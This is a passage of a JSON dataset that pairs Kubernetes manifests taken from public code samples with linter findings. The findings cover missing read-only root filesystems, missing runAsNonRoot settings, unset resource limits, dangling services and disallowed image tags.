    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: veffhz/hipster-paymentservice:v0.0.2\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "7514",
    "manifest_path": "data/manifests/the_stack_sample/sample_2746.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: veffhz/hipster-paymentservice:v0.0.2\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"server\" does not have a read-only root file system"
  },
  {
    "id": "7515",
    "manifest_path": "data/manifests/the_stack_sample/sample_2746.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: veffhz/hipster-paymentservice:v0.0.2\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"server\" is not set to runAsNonRoot"
  },
  {
    "id": "7516",
    "manifest_path": "data/manifests/the_stack_sample/sample_2746.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: veffhz/hipster-paymentservice:v0.0.2\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"server\" has cpu request 0"
  },
  {
    "id": "7517",
    "manifest_path": "data/manifests/the_stack_sample/sample_2746.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: veffhz/hipster-paymentservice:v0.0.2\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"server\" has memory limit 0"
  },
  {
    "id": "7518",
    "manifest_path": "data/manifests/the_stack_sample/sample_2751.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: autoscaler\n    serving.knative.dev/release: devel\n  name: autoscaler\n  namespace: knative-serving\nspec:\n  ports:\n  - name: http\n    port: 8080\n    protocol: TCP\n    targetPort: 8080\n  - name: metrics\n    port: 9090\n    protocol: TCP\n    targetPort: 9090\n  - name: custom-metrics\n    port: 443\n    protocol: TCP\n    targetPort: 8443\n  selector:\n    app: autoscaler\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:autoscaler])"
  },
  {
    "id": "7519",
    "manifest_path": "data/manifests/the_stack_sample/sample_2755.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: presto-worker\n  labels:\n    app: presto\n    unit: worker\nspec:\n  selector:\n    matchLabels:\n      app: presto\n      unit: worker\n  template:\n    metadata:\n      labels:\n        app: presto\n        unit: worker\n    spec:\n      serviceAccountName: presto-sa\n      containers:\n      - name: presto-worker\n        image: mpolatcan/presto:344-java11\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: presto-worker-config\n        ports:\n        - containerPort: 8080\n      securityContext:\n        fsGroup: 1000\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"presto-worker\" does not have a read-only root file system"
  },
  {
    "id": "7520",
    "manifest_path": "data/manifests/the_stack_sample/sample_2755.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: presto-worker\n  labels:\n    app: presto\n    unit: worker\nspec:\n  selector:\n    matchLabels:\n      app: presto\n      unit: worker\n  template:\n    metadata:\n      labels:\n        app: presto\n        unit: worker\n    spec:\n      serviceAccountName: presto-sa\n      containers:\n      - name: presto-worker\n        image: mpolatcan/presto:344-java11\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: presto-worker-config\n        ports:\n        - containerPort: 8080\n      securityContext:\n        fsGroup: 1000\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"presto-sa\" not found"
  },
  {
    "id": "7521",
    "manifest_path": "data/manifests/the_stack_sample/sample_2755.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: presto-worker\n  labels:\n    app: presto\n    unit: worker\nspec:\n  selector:\n    matchLabels:\n      app: presto\n      unit: worker\n  template:\n    metadata:\n      labels:\n        app: presto\n        unit: worker\n    spec:\n      serviceAccountName: presto-sa\n      containers:\n      - name: presto-worker\n        image: mpolatcan/presto:344-java11\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: presto-worker-config\n        ports:\n        - containerPort: 8080\n      securityContext:\n        fsGroup: 1000\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"presto-worker\" is not set to runAsNonRoot"
  },
  {
    "id": "7522",
    "manifest_path": "data/manifests/the_stack_sample/sample_2755.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: presto-worker\n  labels:\n    app: presto\n    unit: worker\nspec:\n  selector:\n    matchLabels:\n      app: presto\n      unit: worker\n  template:\n    metadata:\n      labels:\n        app: presto\n        unit: worker\n    spec:\n      serviceAccountName: presto-sa\n      containers:\n      - name: presto-worker\n        image: mpolatcan/presto:344-java11\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: presto-worker-config\n        ports:\n        - containerPort: 8080\n      securityContext:\n        fsGroup: 1000\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"presto-worker\" has cpu request 0"
  },
  {
    "id": "7523",
    "manifest_path": "data/manifests/the_stack_sample/sample_2755.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: presto-worker\n  labels:\n    app: presto\n    unit: worker\nspec:\n  selector:\n    matchLabels:\n      app: presto\n      unit: worker\n  template:\n    metadata:\n      labels:\n        app: presto\n        unit: worker\n    spec:\n      serviceAccountName: presto-sa\n      containers:\n      - name: presto-worker\n        image: mpolatcan/presto:344-java11\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: presto-worker-config\n        ports:\n        - containerPort: 8080\n      securityContext:\n        fsGroup: 1000\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"presto-worker\" has memory limit 0"
  },
  {
    "id": "7524",
    "manifest_path": "data/manifests/the_stack_sample/sample_2757.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: task-pv-pod\nspec:\n  volumes:\n  - name: task-pv-storage\n    persistentVolumeClaim:\n      claimName: task-pv-claim\n  containers:\n  - name: task-pv-container\n    image: nginx\n    ports:\n    - containerPort: 80\n      name: http-server\n    volumeMounts:\n    - mountPath: /usr/share/nginx/html\n      name: task-pv-storage\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"task-pv-container\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7525",
    "manifest_path": "data/manifests/the_stack_sample/sample_2757.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: task-pv-pod\nspec:\n  volumes:\n  - name: task-pv-storage\n    persistentVolumeClaim:\n      claimName: task-pv-claim\n  containers:\n  - name: task-pv-container\n    image: nginx\n    ports:\n    - containerPort: 80\n      name: http-server\n    volumeMounts:\n    - mountPath: /usr/share/nginx/html\n      name: task-pv-storage\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"task-pv-container\" does not have a read-only root file system"
  },
  {
    "id": "7526",
    "manifest_path": "data/manifests/the_stack_sample/sample_2757.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: task-pv-pod\nspec:\n  volumes:\n  - name: task-pv-storage\n    persistentVolumeClaim:\n      claimName: task-pv-claim\n  containers:\n  - name: task-pv-container\n    image: nginx\n    ports:\n    - containerPort: 80\n      name: http-server\n    volumeMounts:\n    - mountPath: /usr/share/nginx/html\n      name: task-pv-storage\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"task-pv-container\" is not set to runAsNonRoot"
  },
  {
    "id": "7527",
    "manifest_path": "data/manifests/the_stack_sample/sample_2757.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: task-pv-pod\nspec:\n  volumes:\n  - name: task-pv-storage\n    persistentVolumeClaim:\n      claimName: task-pv-claim\n  containers:\n  - name: task-pv-container\n    image: nginx\n    ports:\n    - containerPort: 80\n      name: http-server\n    volumeMounts:\n    - mountPath: /usr/share/nginx/html\n      name: task-pv-storage\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"task-pv-container\" has cpu request 0"
  },
  {
    "id": "7528",
    "manifest_path": "data/manifests/the_stack_sample/sample_2757.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: task-pv-pod\nspec:\n  volumes:\n  - name: task-pv-storage\n    persistentVolumeClaim:\n      claimName: task-pv-claim\n  containers:\n  - name: task-pv-container\n    image: nginx\n    ports:\n    - containerPort: 80\n      name: http-server\n    volumeMounts:\n    - mountPath: /usr/share/nginx/html\n      name: task-pv-storage\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"task-pv-container\" has memory limit 0"
  },
  {
    "id": "7529",
    "manifest_path": "data/manifests/the_stack_sample/sample_2758.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: locust-master\n  labels:\n    name: locust-master\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: locust-master\n  template:\n    metadata:\n      labels:\n        app: locust-master\n    spec:\n      containers:\n      - name: locust-master\n        image: gcr.io/YOUR-PROJECT-ID/locust_tester\n        ports:\n        - name: loc-master\n          containerPort: 8089\n          protocol: TCP\n        - name: loc-master-p1\n          containerPort: 5557\n          protocol: TCP\n        - name: loc-master-p2\n          containerPort: 5558\n          protocol: TCP\n        command:\n        - locust\n        - -f\n        - locust/trtis_grpc_client.py\n        args:\n        - --host\n        - CLUSTER-IP-TRTIS\n        - --master\n        resources:\n          requests:\n            cpu: 200m\n        env:\n        - name: MODEL_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: locust-config\n              key: model\n        - name: SERVER_ADDRESS\n          valueFrom:\n            configMapKeyRef:\n              name: locust-config\n              key: saddr\n        - name: REQUEST_PER_SEC\n          valueFrom:\n            configMapKeyRef:\n              name: locust-config\n              key: rps\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"locust-master\" is using an invalid container image, \"gcr.io/YOUR-PROJECT-ID/locust_tester\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7530",
    "manifest_path": "data/manifests/the_stack_sample/sample_2758.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: locust-master\n  labels:\n    name: locust-master\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: locust-master\n  template:\n    metadata:\n      labels:\n        app: locust-master\n    spec:\n      containers:\n      - name: locust-master\n        image: gcr.io/YOUR-PROJECT-ID/locust_tester\n        ports:\n        - name: loc-master\n          containerPort: 8089\n          protocol: TCP\n        - name: loc-master-p1\n          containerPort: 5557\n          protocol: TCP\n        - name: loc-master-p2\n          containerPort: 5558\n          protocol: TCP\n        command:\n        - locust\n        - -f\n        - locust/trtis_grpc_client.py\n        args:\n        - --host\n        - CLUSTER-IP-TRTIS\n        - --master\n        resources:\n          requests:\n            cpu: 200m\n        env:\n        - name: MODEL_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: locust-config\n              key: model\n        - name: SERVER_ADDRESS\n          valueFrom:\n            configMapKeyRef:\n              name: locust-config\n              key: saddr\n        - name: REQUEST_PER_SEC\n          valueFrom:\n            configMapKeyRef:\n              name: locust-config\n              key: rps\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"locust-master\" does not have a read-only root file system"
  },
  {
    "id": "7531",
    "manifest_path": "data/manifests/the_stack_sample/sample_2758.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: locust-master\n  labels:\n    name: locust-master\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: locust-master\n  template:\n    metadata:\n      labels:\n        app: locust-master\n    spec:\n      containers:\n      - name: locust-master\n        image: gcr.io/YOUR-PROJECT-ID/locust_tester\n        ports:\n        - name: loc-master\n          containerPort: 8089\n          protocol: TCP\n        - name: loc-master-p1\n          containerPort: 5557\n          protocol: TCP\n        - name: loc-master-p2\n          containerPort: 5558\n          protocol: TCP\n        command:\n        - locust\n        - -f\n        - locust/trtis_grpc_client.py\n        args:\n        - --host\n        - CLUSTER-IP-TRTIS\n        - --master\n        resources:\n          requests:\n            cpu: 200m\n        env:\n        - name: MODEL_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: locust-config\n              key: model\n        - name: SERVER_ADDRESS\n          valueFrom:\n            configMapKeyRef:\n              name: locust-config\n              key: saddr\n        - name: REQUEST_PER_SEC\n          valueFrom:\n            configMapKeyRef:\n              name: locust-config\n              key: rps\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"locust-master\" is not set to runAsNonRoot"
  },
  {
    "id": "7532",
    "manifest_path": "data/manifests/the_stack_sample/sample_2758.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: locust-master\n  labels:\n    name: locust-master\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: locust-master\n  template:\n    metadata:\n      labels:\n        app: locust-master\n    spec:\n      containers:\n      - name: locust-master\n        image: gcr.io/YOUR-PROJECT-ID/locust_tester\n        ports:\n        - name: loc-master\n          containerPort: 8089\n          protocol: TCP\n        - name: loc-master-p1\n          containerPort: 5557\n          protocol: TCP\n        - name: loc-master-p2\n          containerPort: 5558\n          protocol: TCP\n        command:\n        - locust\n        - -f\n        - locust/trtis_grpc_client.py\n        args:\n        - --host\n        - CLUSTER-IP-TRTIS\n        - --master\n        resources:\n          requests:\n            cpu: 200m\n        env:\n        - name: MODEL_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: locust-config\n              key: model\n        - name: SERVER_ADDRESS\n          valueFrom:\n            configMapKeyRef:\n              name: locust-config\n              key: saddr\n        - name: REQUEST_PER_SEC\n          valueFrom:\n            configMapKeyRef:\n              name: locust-config\n              key: rps\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"locust-master\" has memory limit 0"
  },
  {
    "id": "7533",
    "manifest_path": "data/manifests/the_stack_sample/sample_2759.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: sapawarga-api\n  namespace: sapawarga\n  labels:\n    app: sapawarga-api\nspec:\n  selector:\n    app: sapawarga-api\n  ports:\n  - name: api-port\n    port: 80\n    protocol: TCP\n    targetPort: 80\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:sapawarga-api])"
  },
  {
    "id": "7534",
    "manifest_path": "data/manifests/the_stack_sample/sample_2760.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: controller-manager\n  namespace: system\n  labels:\n    control-plane: controller-manager\nspec:\n  selector:\n    matchLabels:\n      control-plane: controller-manager\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        control-plane: controller-manager\n    spec:\n      containers:\n      - command:\n        - /manager\n        - --es-host=es-file.kube-logging.svc.cluster.local\n        - --es-port=9200\n        args:\n        - --enable-leader-election\n        image: controller:latest\n        name: manager\n        resources:\n          limits:\n            cpu: 100m\n            memory: 30Mi\n          requests:\n            cpu: 100m\n            memory: 20Mi\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"manager\" is using an invalid container image, \"controller:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7535",
    "manifest_path": "data/manifests/the_stack_sample/sample_2760.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: controller-manager\n  namespace: system\n  labels:\n    control-plane: controller-manager\nspec:\n  selector:\n    matchLabels:\n      control-plane: controller-manager\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        control-plane: controller-manager\n    spec:\n      containers:\n      - command:\n        - /manager\n        - --es-host=es-file.kube-logging.svc.cluster.local\n        - --es-port=9200\n        args:\n        - --enable-leader-election\n        image: controller:latest\n        name: manager\n        resources:\n          limits:\n            cpu: 100m\n            memory: 30Mi\n          requests:\n            cpu: 100m\n            memory: 20Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"manager\" does not have a read-only root file system"
  },
  {
    "id": "7536",
    "manifest_path": "data/manifests/the_stack_sample/sample_2760.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: controller-manager\n  namespace: system\n  labels:\n    control-plane: controller-manager\nspec:\n  selector:\n    matchLabels:\n      control-plane: controller-manager\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        control-plane: controller-manager\n    spec:\n      containers:\n      - command:\n        - /manager\n        - --es-host=es-file.kube-logging.svc.cluster.local\n        - --es-port=9200\n        args:\n        - --enable-leader-election\n        image: controller:latest\n        name: manager\n        resources:\n          limits:\n            cpu: 100m\n            memory: 30Mi\n          requests:\n            cpu: 100m\n            memory: 20Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"manager\" is not set to runAsNonRoot"
  },
  {
    "id": "7537",
    "manifest_path": "data/manifests/the_stack_sample/sample_2761.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: iiscorebox\nspec:\n  containers:\n  - name: myfrontend\n    image: mcr.microsoft.com/windows/servercore/iis:latest\n    volumeMounts:\n    - mountPath: 'e:'\n      name: dynamic-disk-volume\n    - mountPath: 'f:'\n      name: dynamic-az-file-vol\n    - mountPath: 'g:'\n      name: static-az-file-vol\n    - mountPath: 'h:'\n      name: static-disk-volume\n  volumes:\n  - name: dynamic-disk-volume\n    persistentVolumeClaim:\n      claimName: azure-managed-disk\n  - name: dynamic-az-file-vol\n    persistentVolumeClaim:\n      claimName: azure-files\n  - name: static-az-file-vol\n    persistentVolumeClaim:\n      claimName: azurefilestatic\n  - name: static-disk-volume\n    persistentVolumeClaim:\n      claimName: azure-disk-pvc\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"myfrontend\" is using an invalid container image, \"mcr.microsoft.com/windows/servercore/iis:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7538",
    "manifest_path": "data/manifests/the_stack_sample/sample_2761.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: iiscorebox\nspec:\n  containers:\n  - name: myfrontend\n    image: mcr.microsoft.com/windows/servercore/iis:latest\n    volumeMounts:\n    - mountPath: 'e:'\n      name: dynamic-disk-volume\n    - mountPath: 'f:'\n      name: dynamic-az-file-vol\n    - mountPath: 'g:'\n      name: static-az-file-vol\n    - mountPath: 'h:'\n      name: static-disk-volume\n  volumes:\n  - name: dynamic-disk-volume\n    persistentVolumeClaim:\n      claimName: azure-managed-disk\n  - name: dynamic-az-file-vol\n    persistentVolumeClaim:\n      claimName: azure-files\n  - name: static-az-file-vol\n    persistentVolumeClaim:\n      claimName: azurefilestatic\n  - name: static-disk-volume\n    persistentVolumeClaim:\n      claimName: azure-disk-pvc\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"myfrontend\" does not have a read-only root file system"
  },
  {
    "id": "7539",
    "manifest_path": "data/manifests/the_stack_sample/sample_2761.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: iiscorebox\nspec:\n  containers:\n  - name: myfrontend\n    image: mcr.microsoft.com/windows/servercore/iis:latest\n    volumeMounts:\n    - mountPath: 'e:'\n      name: dynamic-disk-volume\n    - mountPath: 'f:'\n      name: dynamic-az-file-vol\n    - mountPath: 'g:'\n      name: static-az-file-vol\n    - mountPath: 'h:'\n      name: static-disk-volume\n  volumes:\n  - name: dynamic-disk-volume\n    persistentVolumeClaim:\n      claimName: azure-managed-disk\n  - name: dynamic-az-file-vol\n    persistentVolumeClaim:\n      claimName: azure-files\n  - name: static-az-file-vol\n    persistentVolumeClaim:\n      claimName: azurefilestatic\n  - name: static-disk-volume\n    persistentVolumeClaim:\n      claimName: azure-disk-pvc\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"myfrontend\" is not set to runAsNonRoot"
  },
  {
    "id": "7540",
    "manifest_path": "data/manifests/the_stack_sample/sample_2761.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: iiscorebox\nspec:\n  containers:\n  - name: myfrontend\n    image: mcr.microsoft.com/windows/servercore/iis:latest\n    volumeMounts:\n    - mountPath: 'e:'\n      name: dynamic-disk-volume\n    - mountPath: 'f:'\n      name: dynamic-az-file-vol\n    - mountPath: 'g:'\n      name: static-az-file-vol\n    - mountPath: 'h:'\n      name: static-disk-volume\n  volumes:\n  - name: dynamic-disk-volume\n    persistentVolumeClaim:\n      claimName: azure-managed-disk\n  - name: dynamic-az-file-vol\n    persistentVolumeClaim:\n      claimName: azure-files\n  - name: static-az-file-vol\n    persistentVolumeClaim:\n      claimName: azurefilestatic\n  - name: static-disk-volume\n    persistentVolumeClaim:\n      claimName: azure-disk-pvc\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"myfrontend\" has cpu request 0"
  },
  {
    "id": "7541",
    "manifest_path": "data/manifests/the_stack_sample/sample_2761.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: iiscorebox\nspec:\n  containers:\n  - name: myfrontend\n    image: mcr.microsoft.com/windows/servercore/iis:latest\n    volumeMounts:\n    - mountPath: 'e:'\n      name: dynamic-disk-volume\n    - mountPath: 'f:'\n      name: dynamic-az-file-vol\n    - mountPath: 'g:'\n      name: static-az-file-vol\n    - mountPath: 'h:'\n      name: static-disk-volume\n  volumes:\n  - name: dynamic-disk-volume\n    persistentVolumeClaim:\n      claimName: azure-managed-disk\n  - name: dynamic-az-file-vol\n    persistentVolumeClaim:\n      claimName: azure-files\n  - name: static-az-file-vol\n    persistentVolumeClaim:\n      claimName: azurefilestatic\n  - name: static-disk-volume\n    persistentVolumeClaim:\n      claimName: azure-disk-pvc\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"myfrontend\" has memory limit 0"
  },
  {
    "id": "7542",
    "manifest_path": "data/manifests/the_stack_sample/sample_2762.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: kafka-consumer\nspec:\n  ports:\n  - port: 80\n    protocol: TCP\n    targetPort: 8081\n    name: http\n  - port: 443\n    protocol: TCP\n    targetPort: 8081\n    name: https\n  selector:\n    app: kafka-consumer\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:kafka-consumer])"
  },
  {
    "id": "7543",
    "manifest_path": "data/manifests/the_stack_sample/sample_2766.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: boskos-reaper\n  labels:\n    app: prow\n    component: boskos-reaper\n  namespace: ci\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: boskos-reaper\n  template:\n    metadata:\n      labels:\n        app: prow\n        component: boskos-reaper\n    spec:\n      containers:\n      - name: boskos-reaper\n        image: gcr.io/k8s-staging-boskos/reaper:v20211015-2401f5c\n        args:\n        - --boskos-url=http://boskos\n        - --resource-type=aws-quota-slice,azure4-quota-slice,azure-2-quota-slice,azurestack-quota-slice,gcp-quota-slice,libvirt-ppc64le-quota-slice,libvirt-s390x-quota-slice,openstack-quota-slice,openstack-kuryr-quota-slice,openstack-vexxhost-quota-slice,openstack-vh-mecha-central-quota-slice,openstack-vh-mecha-az0-quota-slice,openstack-ppc64le-quota-slice,vsphere-quota-slice,ovirt-quota-slice,packet-quota-slice,packet-edge-quota-slice,kubevirt-quota-slice,openstack-osuosl-quota-slice,aws-cpaas-quota-slice,hypershift-quota-slice,alibaba-quota-slice,aws-2-quota-slice,aws-arm64-quota-slice,azurestack-quota-slice,gcp-openshift-gce-devel-ci-2-quota-slice,ibmcloud-quota-slice,metal-quota-slice,osd-ephemeral-quota-slice,ovirt-upgrade-quota-slice,aws-china-quota-slice,aws-usgov-quota-slice,vsphere-discon-quota-slice\n        - --target-state=free\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"boskos-reaper\" does not have a read-only root file system"
  },
  {
    "id": "7544",
    "manifest_path": "data/manifests/the_stack_sample/sample_2766.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: boskos-reaper\n  labels:\n    app: prow\n    component: boskos-reaper\n  namespace: ci\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: boskos-reaper\n  template:\n    metadata:\n      labels:\n        app: prow\n        component: boskos-reaper\n    spec:\n      containers:\n      - name: boskos-reaper\n        image: gcr.io/k8s-staging-boskos/reaper:v20211015-2401f5c\n        args:\n        - --boskos-url=http://boskos\n        - --resource-type=aws-quota-slice,azure4-quota-slice,azure-2-quota-slice,azurestack-quota-slice,gcp-quota-slice,libvirt-ppc64le-quota-slice,libvirt-s390x-quota-slice,openstack-quota-slice,openstack-kuryr-quota-slice,openstack-vexxhost-quota-slice,openstack-vh-mecha-central-quota-slice,openstack-vh-mecha-az0-quota-slice,openstack-ppc64le-quota-slice,vsphere-quota-slice,ovirt-quota-slice,packet-quota-slice,packet-edge-quota-slice,kubevirt-quota-slice,openstack-osuosl-quota-slice,aws-cpaas-quota-slice,hypershift-quota-slice,alibaba-quota-slice,aws-2-quota-slice,aws-arm64-quota-slice,azurestack-quota-slice,gcp-openshift-gce-devel-ci-2-quota-slice,ibmcloud-quota-slice,metal-quota-slice,osd-ephemeral-quota-slice,ovirt-upgrade-quota-slice,aws-china-quota-slice,aws-usgov-quota-slice,vsphere-discon-quota-slice\n        - --target-state=free\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"boskos-reaper\" is not set to runAsNonRoot"
  },
  {
    "id": "7545",
    "manifest_path": "data/manifests/the_stack_sample/sample_2766.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: boskos-reaper\n  labels:\n    app: prow\n    component: boskos-reaper\n  namespace: ci\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: boskos-reaper\n  template:\n    metadata:\n      labels:\n        app: prow\n        component: boskos-reaper\n    spec:\n      containers:\n      - name: boskos-reaper\n        image: gcr.io/k8s-staging-boskos/reaper:v20211015-2401f5c\n        args:\n        - --boskos-url=http://boskos\n        - --resource-type=aws-quota-slice,azure4-quota-slice,azure-2-quota-slice,azurestack-quota-slice,gcp-quota-slice,libvirt-ppc64le-quota-slice,libvirt-s390x-quota-slice,openstack-quota-slice,openstack-kuryr-quota-slice,openstack-vexxhost-quota-slice,openstack-vh-mecha-central-quota-slice,openstack-vh-mecha-az0-quota-slice,openstack-ppc64le-quota-slice,vsphere-quota-slice,ovirt-quota-slice,packet-quota-slice,packet-edge-quota-slice,kubevirt-quota-slice,openstack-osuosl-quota-slice,aws-cpaas-quota-slice,hypershift-quota-slice,alibaba-quota-slice,aws-2-quota-slice,aws-arm64-quota-slice,azurestack-quota-slice,gcp-openshift-gce-devel-ci-2-quota-slice,ibmcloud-quota-slice,metal-quota-slice,osd-ephemeral-quota-slice,ovirt-upgrade-quota-slice,aws-china-quota-slice,aws-usgov-quota-slice,vsphere-discon-quota-slice\n        - --target-state=free\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"boskos-reaper\" has cpu request 0"
  },
  {
    "id": "7546",
    "manifest_path": "data/manifests/the_stack_sample/sample_2766.yaml",
